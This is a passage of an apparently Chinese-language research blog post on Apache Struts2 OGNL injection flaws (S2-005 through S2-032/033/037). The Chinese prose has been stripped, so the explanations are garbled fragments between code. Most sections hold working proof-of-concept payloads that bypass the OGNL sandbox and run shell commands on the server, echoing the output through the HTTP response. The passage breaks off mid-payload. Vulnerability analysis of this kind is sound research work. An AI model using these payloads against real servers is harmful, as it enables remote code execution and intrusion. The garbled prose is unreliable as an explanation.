alt="image-20200507103642250"></p><p>acceptPropertiesexcludeProperties<code>isExclude</code><code>pattern.matcher(null)</code><code>propertiesName</code>null</p><p>S2-005</p><h2 id="3-S2-005"><a href="#3-S2-005" class="headerlink" title="3. S2-005"></a>3. <a href="https://cwiki.apache.org/confluence/display/WW/S2-005" target="_blank" rel="noopener">S2-005</a></h2><p>struts2.0.0 - 2.1.8.1</p><p>S2-005S2-003POC</p><h3 id="POC-1"><a href="#POC-1" class="headerlink" title="POC"></a>POC</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(<span class="string">'\u0023_memberAccess.excludeProperties\u003d@java.util.Collections@EMPTY_SET'</span>)(bla)(bla)&amp;</span><br><span class="line">(<span class="string">'\u0023context[\'xwork.MethodAccessor.denyMethodExecution\']\u003dfalse'</span>)(bla)(bla)&amp;</span><br><span class="line">(<span class="string">'\u0040java.lang.Runtime@getRuntime().exec(\'open\u0020/System/Applications/Calculator.app\')'</span>)(bla)(bla)</span><br></pre></td></tr></table></figure><p>S2-003<code>isAcceptableProperty</code></p><p><code>excludeProperties</code><code>acceptProperties</code></p><p>poc<code>excludeProperties</code></p><p><code>#_memberAccess</code><code>OgnlContext</code><code>memberAccess</code></p><p><code>ognl.OgnlContext#get</code></p><p><img src="/images/talk_about_struts2/image-20200507110201209.png" alt="image-20200507110201209"></p><p><code>OgnlContext</code><code>RESERVED_KEYS</code>getterskey</p><p><code>#_memeberAccess</code><code>OgnlContext</code><code>memeberAccess</code></p><p>contextresponse</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">(a)((<span class="string">'\u0023_memberAccess.excludeProperties\u003d@java.util.Collections@EMPTY_SET'</span>)(bla))&amp;</span><br><span class="line">(a)((<span class="string">'\u0023context[\'xwork.MethodAccessor.denyMethodExecution\']\u003dfalse'</span>)(bla))&amp;</span><br><span class="line">(b)((<span class="string">'\u0023ret\u003d@java.lang.Runtime@getRuntime().exec(\'id\')'</span>)(bla))&amp; <span class="comment">// </span></span><br><span class="line">(c)((<span class="string">'\u0023dis\u003dnew\u0020java.io.DataInputStream(\u0023ret.getInputStream())'</span>)(bla))&amp;</span><br><span class="line">(d)((<span class="string">'\u0023res\u003dnew\u0020byte[2000]'</span>)(bla))&amp;</span><br><span class="line">(e)((<span class="string">'\u0023dis.readFully(\u0023res)'</span>)(bla))&amp;</span><br><span class="line">(f)((<span class="string">'\u0023writer\u003d@org.apache.struts2.ServletActionContext@getResponse().getWriter()'</span>)(bla))&amp;</span><br><span class="line">(g)((<span class="string">'\u0023writer.println(new\u0020java.lang.String(\u0023res))'</span>)(bla))&amp; <span class="comment">// response</span></span><br><span class="line">(h)((<span class="string">'\u0023writer.flush()'</span>)(bla))&amp;</span><br><span class="line">(i)((<span class="string">'\u0023writer.close()'</span>)(bla))</span><br></pre></td></tr></table></figure><p><a href="mailto:`@org.apache.struts2.ServletActionContext" target="_blank" rel="noopener">`@org.apache.struts2.ServletActionContext</a>@getResponse()`response</p><h3 id="-2"><a href="#-2" class="headerlink" title=""></a></h3><p>xwork&gt;=2.2.1.1<code>[a-zA-Z0-9\\.\\]\\[\\(\\)_&#39;\\s]+</code></p><h2 id="4-S2-007"><a href="#4-S2-007" class="headerlink" title="4. S2-007"></a>4. S2-007</h2><p>S2-008</p><p><code>com.opensymphony.xwork2.interceptor.ConversionErrorInterceptor#intercept</code></p><p><img src="/images/talk_about_struts2/image-20200509111903026.png" alt="image-20200509111903026"></p><p>valuegetOverrideExpr</p><p><img src="/images/talk_about_struts2/image-20200509111939166.png" alt="image-20200509111939166"></p><p>payload<code>&#39;+xxxx+&#39;</code>xxxx</p><p><img src="/images/talk_about_struts2/image-20200509112218065.png" alt="image-20200509112218065"></p><p>stackoverrides</p><p>S2-001JSP</p><p><img src="/images/talk_about_struts2/image-20200509114347567.png" alt="image-20200509114347567" style="zoom:50%;"></p><p><code>tryFIndValue</code>stackoverrides<code>Ognl.getValue</code>Ognl</p><h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'+ (#_memberAccess.allowStaticMethodAccess=true,#context['</span>xwork.MethodAccessor.denyMethodExecution<span class="string">']=false,@java.lang.Runtime@getRuntime().exec('</span>open /System/Applications/Calculator.app<span class="string">')) +'</span></span><br></pre></td></tr></table></figure><p>xwork&gt;=2.2.3ognl<code>isAcceptableProperty</code>namenulltrues2-005<code>excludeProperties</code></p><p><img src="/images/talk_about_struts2/image-20200509120444634.png" alt="image-20200509120444634"></p><p><code>allowStaticMethodAccess</code>falsetrue</p><p>POC</p><p>POC</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'+ (</span></span><br><span class="line"><span class="string">#_memberAccess.allowStaticMethodAccess=true,</span></span><br><span class="line"><span class="string">#context['</span>xwork.MethodAccessor.denyMethodExecution<span class="string">']=false,</span></span><br><span class="line"><span class="string">#ret=@java.lang.Runtime@getRuntime().exec('</span>id<span class="string">'),</span></span><br><span class="line"><span class="string">#isr=new java.io.InputStreamReader(#ret.getInputStream()),</span></span><br><span class="line"><span class="string">#br=new java.io.BufferedReader(#isr),</span></span><br><span class="line"><span class="string">#res=new char[2000],</span></span><br><span class="line"><span class="string">#br.read(#res),</span></span><br><span class="line"><span class="string">#writer=#context['</span>com.opensymphony.xwork2.dispatcher.HttpServletResponse<span class="string">'].getWriter(),</span></span><br><span class="line"><span class="string">#writer.println(new java.lang.String(#res)),</span></span><br><span class="line"><span class="string">#writer.flush(),</span></span><br><span class="line"><span class="string">#writer.close()</span></span><br><span class="line"><span class="string">) +'</span></span><br></pre></td></tr></table></figure><h2 id="5-S2-008"><a href="#5-S2-008" class="headerlink" title="5. S2-008"></a>5. S2-008</h2><p>S2-0084<a href="https://cwiki.apache.org/confluence/display/WW/S2-008" target="_blank" rel="noopener">https://cwiki.apache.org/confluence/display/WW/S2-008</a></p><p>1S2-007324</p><h3 id="CookieInterceptor"><a href="#CookieInterceptor" class="headerlink" title="CookieInterceptor"></a>CookieInterceptor</h3><p>S2-005</p><p><code>org.apache.struts2.interceptor.CookieInterceptor#intercept</code></p><p><img src="/images/talk_about_struts2/image-20200509202547849.png" alt="image-20200509202547849"></p><p><img src="/images/talk_about_struts2/image-20200509202741614.png" alt="image-20200509202741614"></p><p><code>OgnlValueStack.setValue</code><code>Ognl.setValue</code><code>((1)(2))(3)</code>OGNL</p><h3 id="DebuggingInterceptor"><a href="#DebuggingInterceptor" class="headerlink" title="DebuggingInterceptor"></a>DebuggingInterceptor</h3><p><img src="/images/talk_about_struts2/image-20200509204915751.png" alt="image-20200509204915751"></p><p><code>debug=command&amp;expression=xxxx</code>OGNL</p><h3 id="POC-1"><a href="#POC-1" class="headerlink" title="POC"></a>POC</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?debug=command&amp;expression=(%<span class="number">23</span>_memberAccess.allowStaticMethodAccess=<span class="keyword">true</span>,<span class="meta">@java</span>.lang.Runtime<span class="meta">@getRuntime</span>().exec(<span class="string">'open /System/Applications/Calculator.app'</span>))</span><br><span class="line"><span class="comment">// POC</span></span><br><span class="line">(%<span class="number">23</span>_memberAccess.allowStaticMethodAccess=<span class="keyword">true</span>,%<span class="number">23</span>ret=<span class="meta">@java</span>.lang.Runtime<span class="meta">@getRuntime</span>().exec(<span class="string">'id'</span>),%<span class="number">23</span>isr=<span class="keyword">new</span> java.io.InputStreamReader(%<span class="number">23</span>ret.getInputStream()),%<span class="number">23</span>br=<span class="keyword">new</span> java.io.BufferedReader(%<span class="number">23</span>isr),%<span class="number">23</span>res=<span class="keyword">new</span> <span class="keyword">char</span>[<span class="number">2000</span>],%<span class="number">23</span>br.read(%<span class="number">23</span>res),<span class="keyword">new</span> java.lang.String(%<span class="number">23</span>res))</span><br></pre></td></tr></table></figure><h2 id="6-S2-009"><a href="#6-S2-009" class="headerlink" title="6. S2-009"></a>6. <a href="https://cwiki.apache.org/confluence/display/WW/S2-009" target="_blank" rel="noopener">S2-009</a></h2><p>2.0.0 - 2.3.1.1</p><p>S2-005<code>[a-zA-Z0-9\\.\\]\\[\\(\\)_&#39;\\s]+</code><code>#</code>unicode</p><p>S2-009S2-005<code>Ognl.setValue</code><code>a[(1)(2)]</code><code>(1)</code>OGNLS2-009contextOGNL<code>key=value</code>value<code>a[(key)(2)]</code>value</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">OgnlContext context = <span class="keyword">new</span> OgnlContext();</span><br><span class="line">context.put(<span class="string">"test"</span>,<span class="string">"@java.lang.Runtime@getRuntime().exec(\'open /System/Applications/Calculator.app/\')"</span>); <span class="comment">// contextOGNLtest</span></span><br><span class="line">Ognl.setValue(<span class="string">"a[(test)(bla)]"</span>,context,<span class="string">""</span>);<span class="comment">// a[(test)(bla)],testOGNL</span></span><br></pre></td></tr></table></figure><p><code>?param=xxx</code></p><p>paramActionpasswordpasswordOGNL</p><p>OGNL<code>(password)(bla)</code>(ASTProperty)</p><p><img src="/images/talk_about_struts2/image-20200511171450014.png" alt="image-20200511171450014"></p><p>action</p><p><img src="/images/talk_about_struts2/image-20200511171056619.png" alt="image-20200511171056619"></p><p><code>com.opensymphony.xwork2.ognl.accessor.CompoundRootAccessor#getProperty</code></p><p><img src="/images/talk_about_struts2/image-20200511204523185.png" alt="image-20200511204523185"></p><p></p><p><code>(1)(2)</code><code>(1)</code>nodegetValue</p><p></p><h3 id="POC-2"><a href="#POC-2" class="headerlink" title="POC"></a>POC</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?password=(%<span class="number">23</span>_memberAccess.allowStaticMethodAccess=<span class="keyword">true</span>,%<span class="number">23</span>context[<span class="string">'xwork.MethodAccessor.denyMethodExecution'</span>]=<span class="keyword">false</span>,<span class="meta">@java</span>.lang.Runtime<span class="meta">@getRuntime</span>().exec(<span class="string">'open /System/Applications/Calculator.app'</span>))&amp;z[(password)(bla)]=<span class="number">1</span></span><br><span class="line"><span class="comment">// POC</span></span><br><span class="line">?password=(%<span class="number">23</span>_memberAccess.allowStaticMethodAccess=<span class="keyword">true</span>,%<span class="number">23</span>context[<span class="string">'xwork.MethodAccessor.denyMethodExecution'</span>]=<span class="keyword">false</span>,%<span class="number">23</span>ret=<span class="meta">@java</span>.lang.Runtime<span class="meta">@getRuntime</span>().exec(<span class="string">'id'</span>),%<span class="number">23</span>isr=<span class="keyword">new</span> java.io.InputStreamReader(%<span class="number">23</span>ret.getInputStream()),%<span class="number">23</span>br=<span class="keyword">new</span> java.io.BufferedReader(%<span class="number">23</span>isr),%<span class="number">23</span>res=<span class="keyword">new</span> <span class="keyword">char</span>[<span class="number">2000</span>],%<span class="number">23</span>br.read(%<span class="number">23</span>res),%<span class="number">23</span>writer=<span class="meta">@org</span>.apache.struts2.ServletActionContext<span class="meta">@getResponse</span>().getWriter(),%<span class="number">23</span>writer.println(<span class="keyword">new</span> java.lang.String(%<span class="number">23</span>res)),%<span class="number">23</span>writer.flush(),%<span class="number">23</span>writer.close())&amp;z[(password)(bla)]=<span class="number">1</span></span><br></pre></td></tr></table></figure><h3 id="-3"><a href="#-3" class="headerlink" title=""></a></h3><p></p><p><img src="/images/talk_about_struts2/image-20200511222139049.png" alt="image-20200511222139049"></p><p><code>setParameter</code></p><p><img src="/images/talk_about_struts2/image-20200511223638532.png" alt="image-20200511223638532"></p><p><img src="/images/talk_about_struts2/image-20200519154216690.png" alt="image-20200519154216690"></p><h2 id="7-S2-012"><a href="#7-S2-012" class="headerlink" title="7. S2-012"></a>7. S2-012</h2><p>Struts Showcase App 2.0.0 - Struts Showcase App 2.3.14.2</p><blockquote><p>The second evaluation happens when redirect result reads it from the stack and uses the previously injected code as redirect parameter.<br>This lets malicious users put arbitrary OGNL statements into any unsanitized String variable exposed by an action and have it evaluated as an OGNL expression to enable method execution and execute arbitrary methods, bypassing Struts and OGNL library protections.</p></blockquote><p>struts2redirect</p><p><img src="/images/talk_about_struts2/image-20200513145252050.png" alt="image-20200513145252050"></p><p><img src="/images/talk_about_struts2/image-20200513145417046.png" alt="image-20200513145417046"></p><p><code>ServletRedirectResult</code></p><p><code>org.apache.struts2.dispatcher.ServletRedirectResult#execute</code></p><p><img src="/images/talk_about_struts2/image-20200513145546225.png" alt="image-20200513145546225"></p><p><img src="/images/talk_about_struts2/image-20200513150115678.png" alt="image-20200513150115678"></p><p>execute<code>conditionalParse</code></p><p><img src="/images/talk_about_struts2/image-20200513150240332.png" alt="image-20200513150240332"></p><p><code>TextParseUtil.translateVariables</code>S2-001String</p><p>paramstruts.xml<code>edit.action?skillName=${currentSkill.name}</code></p><p><code>translateVariables</code></p><p>S2-001</p><p><img src="/images/talk_about_struts2/image-20200513151342610.png" alt="image-20200513151342610"></p><p></p><ol><li><p>xml<code>${currentSkill.name}</code>stack.findValueResultcurrentSkill.name</p><p><img src="/images/talk_about_struts2/image-20200513151651915.png" alt="image-20200513151651915"></p></li><li><p><code>translateVariables</code>OGNL<code>$</code><code>%</code></p><p><img src="/images/talk_about_struts2/image-20200513151842698.png" alt="image-20200513151842698"></p><p><code>$</code><code>${currentSkill.name}</code>result</p><p>(s2-001<code>${}</code>)<code>%</code><code>${%ognl}</code>POC<code>%{}</code>OGNL</p></li></ol><p>S2-012<code>${currentSkill.name}</code></p><h3 id="-4"><a href="#-4" class="headerlink" title=""></a></h3><p><code>2.2.3</code><code>translateVariables</code></p><p><img src="/images/talk_about_struts2/image-20200513155116772.png" alt="image-20200513155116772"></p><p>pos<code>${}%{}</code>posOGNL</p><h3 id="POC-3"><a href="#POC-3" class="headerlink" title="POC"></a>POC</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">currentSkill.name=%&#123;(#_memberAccess[&apos;allowStaticMethodAccess&apos;]=true,#context[&apos;xwork.MethodAccessor.denyMethodExecution&apos;]=false,@java.lang.Runtime@getRuntime().exec(&apos;open /System/Applications/Calculator.app&apos;))&#125;</span><br><span class="line">// POC</span><br><span class="line">%&#123;(#_memberAccess[&apos;allowStaticMethodAccess&apos;]=true,#context[&apos;xwork.MethodAccessor.denyMethodExecution&apos;]=false,#ret=@java.lang.Runtime@getRuntime().exec(&apos;id&apos;),#isr=new java.io.InputStreamReader(#ret.getInputStream()),#br=new java.io.BufferedReader(#isr),#res=new char[2000],#br.read(#res),#writer=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#writer.println(new java.lang.String(#res)),#writer.flush(),#writer.close())&#125;</span><br></pre></td></tr></table></figure><h2 id="8-S2-013-S2-014"><a href="#8-S2-013-S2-014" class="headerlink" title="8. S2-013/S2-014"></a>8. S2-013/S2-014</h2><p>Struts 2.0.0 - Struts 2.3.14.1</p><p>S2-001<code>&lt;s:a&gt;</code><code>&lt;s:url&gt;</code><code>includeParams</code></p><p><img src="/images/talk_about_struts2/image-20200514151446611.png" alt="image-20200514151446611"></p><p>hrefurlhref<code>buildUrl</code>OGNL</p><p></p><p><img src="/images/talk_about_struts2/image-20200514150911888.png" alt="image-20200514150911888" style="zoom:50%;"></p><p><code>org.apache.struts2.views.util.DefaultUrlHelper#translateVariable</code></p><p><img src="/images/talk_about_struts2/image-20200514151844894.png" alt="image-20200514151844894"></p><p>StringOGNL</p><h3 id="POC-4"><a href="#POC-4" class="headerlink" title="POC"></a>POC</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?fakeParam=%&#123;(%<span class="number">23</span>_memberAccess[<span class="string">'allowStaticMethodAccess'</span>]=<span class="keyword">true</span>,%<span class="number">23</span>context[<span class="string">'xwork.MethodAccessor.denyMethodExecution'</span>]=<span class="keyword">false</span>,<span class="meta">@java</span>.lang.Runtime<span class="meta">@getRuntime</span>().exec(<span class="string">'open /System/Applications/Calculator.app'</span>))&#125;</span><br><span class="line"><span class="comment">// POC</span></span><br><span class="line">?fakeParam=%&#123;(%<span class="number">23</span>_memberAccess[<span class="string">'allowStaticMethodAccess'</span>]=<span class="keyword">true</span>,%<span class="number">23</span>context[<span class="string">'xwork.MethodAccessor.denyMethodExecution'</span>]=<span class="keyword">false</span>,%<span class="number">23</span>ret=<span class="meta">@java</span>.lang.Runtime<span class="meta">@getRuntime</span>().exec(<span class="string">'id'</span>),%<span class="number">23</span>isr=<span class="keyword">new</span> java.io.InputStreamReader(%<span class="number">23</span>ret.getInputStream()),%<span class="number">23</span>br=<span class="keyword">new</span> java.io.BufferedReader(%<span class="number">23</span>isr),%<span class="number">23</span>res=<span class="keyword">new</span> <span class="keyword">char</span>[<span class="number">2000</span>],%<span class="number">23</span>br.read(%<span class="number">23</span>res),%<span class="number">23</span>writer=<span class="meta">@org</span>.apache.struts2.ServletActionContext<span class="meta">@getResponse</span>().getWriter(),%<span class="number">23</span>writer.println(<span class="keyword">new</span> java.lang.String(%<span class="number">23</span>res)),%<span class="number">23</span>writer.flush(),%<span class="number">23</span>writer.close())&#125;</span><br></pre></td></tr></table></figure><h3 id="-5"><a href="#-5" class="headerlink" title=""></a></h3><p><img src="/images/talk_about_struts2/image-20200514152500049.png" alt="image-20200514152500049"></p><p><img src="/images/talk_about_struts2/image-20200514152517255.png" alt="image-20200514152517255"></p><p><code>org.apache.struts2.views.util.DefaultUrlHelper</code>TextParseUtil</p><h2 id="9-S2-015"><a href="#9-S2-015" class="headerlink" title="9. S2-015"></a>9. S2-015</h2><p>Struts 2.0.0 - Struts 2.3.14.2</p><p>S2-015</p><p>S2-012action name</p><p><img src="/images/talk_about_struts2/image-20200514165546294.png" alt="image-20200514165546294"></p><p><code>{1}</code><code>xxx.action</code><code>xxx</code><code>xxx</code>OGNL<code>TextParseUtil.translateVariables</code>S2-012</p><p>httpheader<code>${message}</code></p><p><img src="/images/talk_about_struts2/image-20200514202040764.png" alt="image-20200514202040764"></p><p><code>org.apache.struts2.dispatcher.HttpHeaderResult#execute</code></p><p><img src="/images/talk_about_struts2/image-20200514202919865.png" alt="image-20200514202919865"></p><p>S2-012<code>${%OGNL}</code></p><h3 id="POC-5"><a href="#POC-5" class="headerlink" title="POC"></a>POC</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// https://www.freebuf.com/vuls/217482.html</span><br><span class="line">%24%7B%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%2C%23m%3D%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29%2C%23m.setAccessible%28true%29%2C%23m.set%28%23_memberAccess%2Ctrue%29%2C%23q%3D@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27ifconfig%27%29.getInputStream%28%29%29%2C%23q%7D.action</span><br><span class="line">// </span><br><span class="line">message=%&#123;#context[&apos;xwork.MethodAccessor.denyMethodExecution&apos;]=false,#m=#_memberAccess.getClass().getDeclaredField(&apos;allowStaticMethodAccess&apos;),#m.setAccessible(true),#m.set(#_memberAccess,true),#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&apos;ifconfig&apos;).getInputStream()),#writer=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#writer.println(#q),#writer.flush(),#writer.close()&#125;</span><br></pre></td></tr></table></figure><p><code>#_memberAccess[&#39;allowStaticMethodAccess&#39;]=true</code></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// </span></span><br><span class="line">#_memberAccess['allowStaticMethodAccess']=true</span><br><span class="line"></span><br><span class="line"><span class="comment">// #_memberAccess['allowStaticMethodAccess']</span></span><br><span class="line">#m=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),</span><br><span class="line">#m.setAccessible(true),</span><br><span class="line">#m.set(#_memberAccess,true)</span><br></pre></td></tr></table></figure><p></p><p>OGNLsetValue</p><p><code>ognl.OgnlRuntime#setFieldValue</code></p><p><img src="/images/talk_about_struts2/image-20200514173311368.png" alt="image-20200514173311368"></p><p><code>#_memberAccess[&#39;allowStaticMethodAccess&#39;]</code></p><p><img src="/images/talk_about_struts2/image-20200514173631503.png" alt="image-20200514173631503"></p><p>final</p><p>struts2 2.3.14.1poc</p><p><code>new ProccessBuilder(&#39;id&#39;).start()</code></p><h3 id="-6"><a href="#-6" class="headerlink" title=""></a></h3><p>S2-012OGNL<code>${%OGNL}</code></p><h2 id="10-S2-016"><a href="#10-S2-016" class="headerlink" title="10. S2-016"></a>10. S2-016</h2><p>Struts 2.0.0 - Struts 2.3.15</p><p>S2-016<code>action:xxx</code><code>redirect:xxx</code><code>xxx</code>OGNLStruts2<code>ServletRedirectResult</code>S2-012url</p><p>S2-012</p><h3 id="POC-6"><a href="#POC-6" class="headerlink" title="POC"></a>POC</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redirect:%&#123;#context['xwork.MethodAccessor.denyMethodExecution']=false,#m=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),#m.setAccessible(true),#m.set(#_memberAccess,true),#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream()),#writer=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#writer.println(#q),#writer.flush(),#writer.close()&#125;</span><br></pre></td></tr></table></figure><h3 id="-7"><a href="#-7" class="headerlink" title=""></a></h3><p><code>org.apache.struts2.dispatcher.mapper.DefaultActionMapper</code><code>redirect/redirectaction</code></p><p><img src="/images/talk_about_struts2/image-20200515154730941.png" alt="image-20200515154730941"></p><p><code>action:</code>S2-015action</p><p><img src="/images/talk_about_struts2/image-20200515154855569.png" alt="image-20200515154855569"></p><p></p><h2 id="11-S2-019"><a href="#11-S2-019" class="headerlink" title="11. S2-019"></a>11. S2-019</h2><p>Struts 2.0.0 - Struts 2.3.15.1</p><p>S2-019S2-008commandOGNL</p><p>S2-008</p><h3 id="POC-7"><a href="#POC-7" class="headerlink" title="POC"></a>POC</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?debug=command&amp;expression=(%23context[&apos;xwork.MethodAccessor.denyMethodExecution&apos;]=false,%23m=%23_memberAccess.getClass().getDeclaredField(&apos;allowStaticMethodAccess&apos;),%23m.setAccessible(true),%23m.set(%23_memberAccess,true),%23q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&apos;id&apos;).getInputStream()),%23writer=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23writer.println(%23q),%23writer.flush(),%23writer.close())</span><br></pre></td></tr></table></figure><h3 id="-8"><a href="#-8" class="headerlink" title=""></a></h3><p>commanddebugOGNL</p><p>struts2 2.3.20excludedClasses, excludedPackageNames  excludedPackageNamePatterns</p><p>SecurityMemberAccess<a href="https://paper.seebug.org/794/#33-struts-2329" target="_blank" rel="noopener">https://paper.seebug.org/794/#33-struts-2329</a></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">debug=command&amp;expression=((#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(@java.lang.Runtime@getRuntime().exec('open+/System/Applications/Calculator.app')))</span><br></pre></td></tr></table></figure><p></p><h2 id="12-S2-029-S2-036"><a href="#12-S2-029-S2-036" class="headerlink" title="12. S2-029/S2-036"></a>12. S2-029/S2-036</h2><p>S2-029Struts 2.0.0 - Struts 2.3.24.1 (except 2.3.20.3)</p><p>S2-036Struts 2.0.0 - Struts 2.3.28.1 S2-029</p><p>S2-001S2-029jsp<code>&lt;s:textfield name=&quot;%{xxxx}&quot;&gt;&lt;/s:textfield&gt;</code>nameOGNLinputname?xxxx=usernameinput.nameusername<code>%{xxxx}</code>xxxxS2-001OGNLS2-029translateVariablesOGNL</p><p><img src="/images/talk_about_struts2/image-20200519143433067.png" alt="image-20200519143433067"></p><p><code>UIBean.evaluateParams</code></p><p><code>%{message}</code>OGNL</p><p><img src="/images/talk_about_struts2/image-20200519144431546.png" alt="image-20200519144431546"></p><p>OGNL<code>%{xxx}</code></p><p><img src="/images/talk_about_struts2/image-20200519144525695.png" alt="image-20200519144525695"></p><p><img src="/images/talk_about_struts2/image-20200519144603429.png" alt="image-20200519144603429"></p><p><code>findValue</code>OGNLS2-001OGNL</p><h3 id="POC-8"><a href="#POC-8" class="headerlink" title="POC"></a>POC</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SecurityMemberAccess</span></span><br><span class="line">?message=((%<span class="number">23</span>_memberAccess=<span class="meta">@ognl</span>.OgnlContext<span class="meta">@DEFAULT</span>_MEMBER_ACCESS).(<span class="meta">@java</span>.lang.Runtime<span class="meta">@getRuntime</span>().exec(<span class="string">'open+/System/Applications/Calculator.app'</span>)))</span><br><span class="line"><span class="comment">// POC</span></span><br><span class="line">?message=(%<span class="number">23</span>_memberAccess=<span class="meta">@ognl</span>.OgnlContext<span class="meta">@DEFAULT</span>_MEMBER_ACCESS,%<span class="number">23</span>ret=<span class="meta">@java</span>.lang.Runtime<span class="meta">@getRuntime</span>().exec(<span class="string">'id'</span>)),%<span class="number">23</span>q=<span class="meta">@org</span>.apache.commons.io.IOUtils<span class="meta">@toString</span>(%<span class="number">23</span>ret.getInputStream())</span><br><span class="line"> <span class="comment">// S2-036</span></span><br><span class="line"> ((#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ret=@java.lang.Runtime@getRuntime().exec('id'))).(#q=@org.apache.commons.io.IOUtils@toString(#ret.getInputStream()))</span><br></pre></td></tr></table></figure><h3 id="S2-029"><a href="#S2-029" class="headerlink" title="S2-029"></a>S2-029</h3><p><code>com.opensymphony.xwork2.ognl.OgnlUtil#compileAndExecute</code></p><p><img src="/images/talk_about_struts2/image-20200519152941105.png" alt="image-20200519152941105"></p><p></p><p><img src="/images/talk_about_struts2/image-20200519153530702.png" alt="image-20200519153530702"></p><p><img src="/images/talk_about_struts2/image-20200519153555655.png" alt="image-20200519153555655"></p><p><code>node.isEvalChain</code>S2-009<code>((1)(2))</code><code>ASTEval</code><code>ASTEval</code><code>isEvalChain</code>true<code>(1)(2)</code></p><p><code>node.isSequence</code><code>(xxx1,xxx2,xxx3)</code>OGNL<code>ASTSequence</code><code>ASTSequence</code><code>isSequence</code>true</p><p><code>((xxx1).(xxx2).(xxx3))</code>OGNL<code>ASTChain</code><code>ASTEval</code></p><p>S2-029bypassS2-036</p><h2 id="13-S2-032-S2-033-S2-037"><a href="#13-S2-032-S2-033-S2-037" class="headerlink" title="13. S2-032/S2-033/S2-037"></a>13. S2-032/S2-033/S2-037</h2><p>Struts 2.3.20 - Struts Struts 2.3.28 (except 2.3.20.3 and 2.3.24.3)</p><p>rest-showcaseS2-033S2-032<code>method:#_xxxx</code>)</p><p>rest-plugin<code>xxx!method</code></p><p><code>org.apache.struts2.rest.RestActionMapper#handleDynamicMethodInvocation</code><code>name!method</code><code>restactionmapper</code>method</p><p><img src="/images/talk_about_struts2/image-20200520223124404.png" alt="image-20200520223124404"></p><p>struts2intercepterDefaultActionInvocationinvokeActionOnly</p><p><img src="/images/talk_about_struts2/image-20200520223603177.png" alt="image-20200520223603177"></p><p>invokeActionOnly<code>com.opensymphony.xwork2.DefaultActionInvocation#invokeAction</code></p><p><img src="/images/talk_about_struts2/image-20200520223738228.png" alt="image-20200520223738228"></p><p>methodName<code>ognlUtil.getValue</code>OGNL</p><p>interceptorOGNL<code>devMode</code></p><h3 id="POC-9"><a href="#POC-9" class="headerlink" title="POC"></a>POC</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http:<span 